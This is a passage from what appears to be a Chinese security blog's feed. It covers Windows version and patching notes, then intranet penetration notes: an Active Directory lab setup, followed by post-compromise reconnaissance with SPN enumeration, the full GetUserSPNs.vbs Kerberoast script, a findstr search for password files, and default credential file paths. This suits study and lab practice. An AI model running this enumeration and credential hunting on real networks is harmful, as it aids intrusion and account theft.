6.3</td><td align="center">Windows 8.1 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2013年</td><td align="center">NT 6.3</td><td align="center">Windows RT 8.1 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2013年</td><td align="center">NT 6.3</td><td align="center">Windows Server 2012 R2 （至2023/1/9停止支持）</td><td align="center">9600</td></tr><tr><td align="center">2014年</td><td align="center">NT 6.3</td><td align="center">Windows Phone 8.1 （已停止支持）</td><td align="center">12307</td></tr><tr><td align="center">2015年</td><td align="center">NT 10.0</td><td align="center">Windows 10 （每个家庭版和专业版支持1.5年每个教育版和企业版支持2.5年) || 10240</td><td align="center"></td></tr><tr><td align="center">2015年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1511</td><td align="center">10587</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1607</td><td align="center">14393</td></tr><tr><td align="center">2017年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1703</td><td align="center">15063</td></tr><tr><td align="center">2017年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1709</td><td align="center">16299</td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1803</td><td align="center">17134</td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1809</td><td align="center">17763</td></tr><tr><td align="center">2019年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1903</td><td align="center">18362</td></tr><tr><td align="center">2019年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v1909</td><td align="center">18363</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2004</td><td align="center">19041</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 v2009</td><td align="center">19042</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 MN</td><td align="center">19645</td></tr><tr><td align="center">2020年</td><td align="center">NT 10.0</td><td align="center">Windows 10 FE</td><td align="center">20161(每个长期支持版本技术支持5年，加上扩展支持后共10年)</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows 10 Mobile (已停止支持)</td><td align="center">10240(TH1),10587(TH2),14352(RS1),14822(RS2),16212(RS3)</td></tr><tr><td align="center">2016年</td><td align="center">NT 10.0</td><td align="center">Windows Server 2016 （至2026/10/13停止支持）</td><td align="center"></td></tr><tr><td align="center">2018年</td><td align="center">NT 10.0</td><td align="center">Windows Server 2019 （至2029/1/9停止支持）</td><td align="center"></td></tr></tbody></table><h3 id="Windows编号区别"><a href="#Windows编号区别" class="headerlink" title="Windows编号区别"></a>Windows编号区别</h3><blockquote><h4 id="R2和普通版本区别"><a href="#R2和普通版本区别" class="headerlink" title="R2和普通版本区别"></a>R2和普通版本区别</h4></blockquote><p>拿Windows Server 2008相关版本来举例，Windows Server 2008 是 Vista 的服务器版，Windows Server 2008  R2 是 Windows 7 的服务器版，也就是说他们使用的内核是不相同的，<strong>同时也可以通过系统是否带R2来区分是否是Windows Server版本，也就是说像Windows 7、Windows 8、Windows 10等操作系统是不存在有R2这种版本的</strong>。</p><blockquote><h4 id="SP1、SP2、SP3、SP4区别"><a href="#SP1、SP2、SP3、SP4区别" class="headerlink" title="SP1、SP2、SP3、SP4区别"></a>SP1、SP2、SP3、SP4区别</h4></blockquote><p>拿Windows 7相关版本来举例，Windows 7是最初始的发行版本，Windows 7 SP1是在Windows 7版本上的一个增量更新版本，同理SP2之类的都是相同的。</p><h3 id="Windows更新"><a href="#Windows更新" class="headerlink" title="Windows更新"></a>Windows更新</h3><blockquote><h4 id="联网更新"><a href="#联网更新" class="headerlink" title="联网更新"></a>联网更新</h4></blockquote><p>这个直接更新就行了简单的很，不多赘述</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/5.png" alt="image-20201102175224207"></p><blockquote><h4 id="无网络更新"><a href="#无网络更新" class="headerlink" title="无网络更新"></a>无网络更新</h4></blockquote><p>比如需要安装KB4012212这个补丁，先去这个网站中搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.catalog.update.microsoft.com&#x2F;home.aspx</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/6.png" alt="image-20201102175840970"></p><p>从图中可以看到Windows 7有两个版本X86和X64版本，点进去就能看到对应的处理器版本</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/7.png" alt="image-20201102180201399"></p><p>接着只要下载后安装即可</p><blockquote><blockquote><h5 id="离线补丁的一个坑"><a href="#离线补丁的一个坑" class="headerlink" title="离线补丁的一个坑"></a>离线补丁的一个坑</h5></blockquote></blockquote><p>安装补丁后无法重启服务器，一直跳到这个界面上面，主要的原因就是机器找不到启动位置了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/10.png" alt="image-20201104152001918"></p><p>首先打开命令提示符，然后输入下面内容部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit &#x2F;enum &#123;default&#125;   #这一步要查看device属性，partation&#x3D; xxx</span><br><span class="line">bcdboot e:\windows        #根据上一步的结果，确认xxx是哪个盘符(一般是E盘)，然后回车执行</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/HardwareRelated/11.png" alt="image-20201104152024338"></p><p>成功后重启机器即可</p><blockquote><h4 id="无网络快速找补丁"><a href="#无网络快速找补丁" class="headerlink" title="无网络快速找补丁"></a>无网络快速找补丁</h4></blockquote><p>有两种方法，第一种不适用于全部系统，有些系统没办法找到，第二种方法使用与全部系统</p><ul><li><p>首先下载个360安全卫士离线安装包，来搜索补丁</p></li><li><p>通过特定的语句在微软补丁网站来搜索补丁，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2020-适用于 Windows Server 2019 的 09 更新</span><br><span class="line">#20XX-适用于 Windows XX 的 XX 更新</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红蓝功防相关笔记总结</title>
    <link href="https://www.ascotbe.com/2020/08/03/IntranetPenetration/"/>
    <id>https://www.ascotbe.com/2020/08/03/IntranetPenetration/</id>
    <published>2020-08-03T13:45:42.000Z</published>
    <updated>2021-06-11T08:48:36.304Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>本文全程紧跟jumbo师傅写的文章来复现，内网对我来说是一个新的领域，文章会参考多个师傅中的分析来完成，当然有些自己的想法在里面，后续如果有新思路会往这里面添加</p><blockquote><p>PS</p></blockquote><p>目前就差委派没有写了</p><h2 id="搭建域环境"><a href="#搭建域环境" class="headerlink" title="搭建域环境"></a>搭建域环境</h2><blockquote><p>环境清单</p></blockquote><p>由于我们需要域环境模拟常规的内网，所以搭建域环境</p><ul><li>Windows 2008 R2 X64</li><li>Windows 10</li><li>Windows 7 SP1 X64</li></ul><p>Windows需要执行<code>set-executionpolicy remotesigned</code>来打开默认不允许执行ps脚本</p><h3 id="配置静态IP"><a href="#配置静态IP" class="headerlink" title="配置静态IP"></a>配置静态IP</h3><p>位置：网络和共享中心-&gt;本地连接-&gt;属性-&gt;IPV4</p><p>然后需要设置一个DNS指向本机，因为它后面是一个域控的角色，IP地址可以在详细信息里面看，最好和现在类似。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/1.png" alt="image-20200729222159021"></p><h3 id="配置域环境"><a href="#配置域环境" class="headerlink" title="配置域环境"></a>配置域环境</h3><p>在服务管理器中添加角色</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/2.png" alt="image-20200729222459835"></p><p>然后勾选这个，这边提一句在创建域的时候还需要把当前用户设置为强密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/3.png" alt="image-20200729222546079"></p><p>然后就是无脑下一步安装，就可以安装成功了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/4.png" alt="image-20200729222646209"></p><p>接着我们点开角色位置</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/5.png" alt="image-20200729222814376"></p><p>会看到这个提示，我们只要点击蓝色的位置也就是<strong>dcpromo.exe</strong>就会出来这个页面</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/6.png" alt="image-20200729222917906"></p><p>点击下一步</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/7.png" alt="image-20200729223024238"></p><p>这边看了一下倾旋师傅写的<strong>Windows NT 4.0兼容的加密算法</strong>相关说明，这个算法是低版本的SMBv1客户端，在进行NTLM网络认证的过程中采用的算法较为简单，能够轻易破解，并且可能会受到Pass The Hash的技术手段利用、MS17-010等漏洞的危害，现在都是SMBv3的版本了</p><p>我们下一步</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/8.png" alt="image-20200729223717033"></p><p>这边选择<strong>新林</strong>，林表示多个域的集合，因为我们只有一个域所以这边用新的林。如果你设置了密码还是报错说你账户密码不符合要求的话就在命令行里面输入即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator &#x2F;passwordreq:yes</span><br></pre></td></tr></table></figure><p>然后这边会要我们输入一个域名，我这边就填我博客的域名了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/9.png" alt="image-20200729225803364"></p><p>接着下一步可以看到，选择级别，我们直接选默认的2003</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/10.png" alt="image-20200729225859743"></p><p>一直下一步会弹出这个</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/11.png" alt="image-20200729230152688"></p><p>点击是</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/12.png" alt="image-20200729230236422"></p><p>然后设置DC管理员密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/13.png" alt="image-20200729230312638"></p><p>下一步后就能看到设置内容了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/14.png" alt="image-20200729230418827"></p><p>然后点击完成后重启，这边等就好了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/15.png" alt="image-20200729230456239"></p><p>重启后可以看到配置成功了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/16.png" alt="image-20200729231055590"></p><h3 id="加入于环境"><a href="#加入于环境" class="headerlink" title="加入于环境"></a>加入于环境</h3><p>接着我们打开准备好的Windows 10来ping下域IP是否能通</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/17.png" alt="image-20200729231256289"></p><p>然然后将当前主机的DNS服务器设置为DC的IP</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/18.png" alt="image-20200729231448959"></p><p>然后ping下我们的域</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/19.png" alt="image-20200729231549287"></p><p>接着找到系统属性</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/20.png" alt="image-20200729231932391"></p><p>点击网络</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/21.png" alt="image-20200729231951186"></p><p>点击下一步</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/22.png" alt="image-20200729232030994"></p><p>点击下一步，然后到这个页面，我们填上用户名，然后先不要点击下一步</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/23.png" alt="image-20200729234534909"></p><p>我们切换到windows 2008那台域控里面，新建一个用户</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/24.png" alt="image-20200729232339467"></p><p>然后填写用户名</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/25.png" alt="image-20200729234417477"></p><p>下一步后填写密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/26.png" alt="image-20200729232533961"></p><p>然后我们回到Windows 10，填上我们设置好的密码，和域名</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/27.png" alt="image-20200729234508295"></p><p>这边可能会报错说域不同，具体按上面写的信息来填就能到这一步</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/28.png" alt="image-20200729234734276"></p><p>然后点击下一步，选着<strong>Users</strong>权限</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/29.png" alt="image-20200729234817121"></p><p>下一步后重启完就行了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/30.png" alt="image-20200729234940152"></p><p>可以看到我们在域环境下并且能上网了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/31.png" alt="image-20200729235153363"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。</p><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>这个也是我第一次接触，谷歌了一下，这边直接饮用官方介绍。SPN 是服务在使用 Kerberos 身份验证的网络上的唯一标识符，它由服务类、主机名和端口组成。在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。</p><blockquote><p>特点</p></blockquote><p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以快速发现内网中的资产以及服务</p><ol><li><p><strong>利用Windows自带的setspn工具，普通域用户权限执行即可</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/32.png" alt="image-20200730212937561"></p><p>由截图可以看到<strong>WIN-1OUEMJB0766</strong>（DC服务器）上面运行DNS服务，该命令可以把内网的相关服务都扫描出来包括mysql之类的</p></li><li><p><strong>利用GetUserSPNs.vbs获取SPN结果</strong></p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;nidem&#x2F;kerberoast</span><br></pre></td></tr></table></figure><p>其中的源码</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27; Edits by Tim Medin</span></span><br><span class="line"><span class="comment">&#x27; File:     GetUserSPNS.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents: Query the domain to find SPNs that use User accounts</span></span><br><span class="line"><span class="comment">&#x27; Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast</span></span><br><span class="line"><span class="comment">&#x27;           The password hash used with Computer accounts are infeasible to </span></span><br><span class="line"><span class="comment">&#x27;           crack; however, if the User account associated with an SPN may have</span></span><br><span class="line"><span class="comment">&#x27;           a crackable password. This tool will find those accounts. You do not</span></span><br><span class="line"><span class="comment">&#x27;           need any special local or domain permissions to run this script. </span></span><br><span class="line"><span class="comment">&#x27;           This script on a script supplied by Microsoft (details below).</span></span><br><span class="line"><span class="comment">&#x27; History:    2014/11/12     Tim Medin    Created</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; Original Script Details:</span></span><br><span class="line"><span class="comment">&#x27; Copyright (c) Microsoft Corporation 2004 -</span></span><br><span class="line"><span class="comment">&#x27; File:                querySpn.vbs</span></span><br><span class="line"><span class="comment">&#x27; Contents:     Query a given SPN in a given forest to find the owners</span></span><br><span class="line"><span class="comment">&#x27; History:         7/7/2004     Craig Wiand     Created        </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Option</span> <span class="keyword">Explicit</span>         </span><br><span class="line"><span class="keyword">Dim</span> oConnection, oCmd, oRecordSet</span><br><span class="line"><span class="keyword">Dim</span> oGC, oNSP</span><br><span class="line"><span class="keyword">Dim</span> strGCPath, strClass, strADOQuery</span><br><span class="line"><span class="keyword">Dim</span> vObjClass, vSPNs, vName</span><br><span class="line"></span><br><span class="line">ParseCommandLine()</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Set up the connection ---</span></span><br><span class="line"><span class="keyword">Set</span> oConnection = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Connection&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> oCmd = <span class="built_in">CReateObject</span>(<span class="string">&quot;ADODB.Command&quot;</span>)</span><br><span class="line">oConnection.Provider = <span class="string">&quot;ADsDSOObject&quot;</span></span><br><span class="line">oConnection.Open <span class="string">&quot;ADs Provider&quot;</span></span><br><span class="line"><span class="keyword">Set</span> oCmd.ActiveConnection = oConnection</span><br><span class="line">oCmd.Properties(<span class="string">&quot;Page Size&quot;</span>) = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Build the query string ---</span></span><br><span class="line">strADOQuery = <span class="string">&quot;&lt;&quot;</span> + strGCPath + <span class="string">&quot;&gt;;(&amp;(!objectClass=computer)(servicePrincipalName=*));&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;dnsHostName,distinguishedName,servicePrincipalName,objectClass,&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;samAccountName;subtree&quot;</span></span><br><span class="line">oCmd.CommandText = strADOQuery</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Execute the query for the object in the directory ---</span></span><br><span class="line"><span class="keyword">Set</span> oRecordSet = oCmd.<span class="keyword">Execute</span></span><br><span class="line"><span class="keyword">If</span> oRecordSet.EOF <span class="keyword">and</span> oRecordSet.Bof <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;No SPNs found!&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">Not</span> oRecordset.Eof</span><br><span class="line">Wscript.Echo oRecordset.Fields(<span class="string">&quot;distinguishedName&quot;</span>)</span><br><span class="line"><span class="comment">&#x27;vObjClass = oRecordset.Fields(&quot;objectClass&quot;)</span></span><br><span class="line"><span class="comment">&#x27;strClass = vObjClass( UBound(vObjClass) )</span></span><br><span class="line"><span class="comment">&#x27;Wscript.Echo &quot;Class: &quot; &amp; strClass</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">UCase</span>(strClass) = <span class="string">&quot;COMPUTER&quot;</span> <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;Computer DNS: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;dnsHostName&quot;</span>)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;User Logon: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;samAccountName&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Display the SPNs on the object --- </span></span><br><span class="line">vSPNs = oRecordset.Fields(<span class="string">&quot;servicePrincipalName&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> vName <span class="keyword">in</span> vSPNs</span><br><span class="line">Wscript.Echo <span class="string">&quot;-- &quot;</span> + vName</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">oRecordset.MoveNext</span><br><span class="line"><span class="keyword">Wend</span></span><br><span class="line"></span><br><span class="line">oRecordset.Close</span><br><span class="line">oConnection.Close</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ShowUsage()</span><br><span class="line">Wscript.Echo <span class="string">&quot; USAGE:        &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; SpnToFind [GC Servername or Forestname]&quot;</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; Corp.com&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ParseCommandLine()</span><br><span class="line"><span class="keyword">If</span> WScript.Arguments.Count = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">If</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-h&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;--help&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-?&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;/?&quot;</span> <span class="keyword">Then</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">strGCPath = <span class="string">&quot;GC://&quot;</span> &amp; WScript.Arguments(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">ElseIf</span> WScript.Arguments.Count = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line"><span class="comment">&#x27; Set the GC</span></span><br><span class="line"><span class="keyword">Set</span> oNSP = <span class="built_in">GetObject</span>(<span class="string">&quot;GC:&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> oGC <span class="keyword">in</span> oNSP</span><br><span class="line">strGCPath = oGC.ADsPath</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/33.png" alt="image-20200730214227054"></p></li></ol><h3 id="端口连接"><a href="#端口连接" class="headerlink" title="端口连接"></a>端口连接</h3><p>利用<code>netstat -ano</code>命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/34.png" alt="image-20200730215441721"></p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr  /s /m <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure><p>这条命令是查找当前文件夹下的文件，不是全局搜索</p><p>接下来是各个中间件的默认配置文件路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Tomcat</span><br><span class="line">&#x2F;CATALINA_HOME&#x2F;conf&#x2F;tomcat-users.xml</span><br><span class="line">#Apache</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">#Nginx</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">#Wdcp</span><br><span class="line">&#x2F;www&#x2F;wdlinux&#x2F;wdcp&#x2F;conf&#x2F;mrpw.conf</span><br><span class="line">#Mysql</span><br><span class="line">&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD</span><br></pre></td></tr></table></figure><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h4 id="net参数详解"><a href="#net参数详解" class="headerlink" title="net参数详解"></a>net参数详解</h4><p>直接使用<code>net /?</code>命令即可查看，下面是我用谷歌翻译的，凑合看</p><blockquote><p>ACCOUNTS</p></blockquote><p>如果输入不带参数的<code>net accounts</code>显示当前密码设置、登录时限及域信息</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>/forcelogoff:&#123;minutes|no&#125;</code></td><td>设置当用户帐号或有效登录时间过期时</td></tr><tr><td><code>/minpwlen:length</code></td><td>设置用户帐号密码的最少字符数</td></tr><tr><td><code>/maxpwage:&#123;days|unlimited&#125;</code></td><td>设置用户帐号密码有效的最大天数</td></tr><tr><td><code>/minpwage:days</code></td><td>设置用户必须保持原密码的最小天数</td></tr><tr><td><code>/uniquepw:number</code></td><td>要求用户更改密码时，必须在经过number次后才能重复使用与之相同的密码</td></tr><tr><td><code>/domain</code></td><td>在当前域的主域控制器上执行该操作</td></tr><tr><td><code>/sync</code></td><td>当用于主域控制器时，该命令使域中所有备份域控制器同步</td></tr></tbody></table><blockquote><p>COMPUTER </p></blockquote><p>作用：从域数据库中添加或删除计算机。</p><p>命令格式：<code>net computer \\computername &#123;/add | /del&#125;</code></p><p>举例：<code>net computer \\ascotbe /add</code>将计算机<strong>ascotbe</strong>添加到登录域。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>指定要添加到域或从域中删除的计算机</td></tr><tr><td><code>/add</code></td><td>将指定计算机添加到域</td></tr><tr><td><code>/del</code></td><td>将指定计算机从域中删除</td></tr></tbody></table><blockquote><p>CONFIG</p></blockquote><p>作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。</p><p>命令格式：<code>net config [SERVER | WORKSTATION]</code></p><p>输入不带参数的命令<code>net config</code>显示可配置服务的列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>service</code></td><td>服务器</td></tr><tr><td><code>WORKSTATION</code></td><td>工作站</td></tr></tbody></table><blockquote><p>CONTINUE</p></blockquote><p>作用：重新激活挂起的服务。</p><p>命令格式：<code>net continue service</code></p><blockquote><p> FILE</p></blockquote><p>作用：显示某服务器上所有打开的共享文件名及锁定文件数。</p><p>命令格式：<code>net file [id [/close]]</code></p><p>输入不带参数的命令<code>net 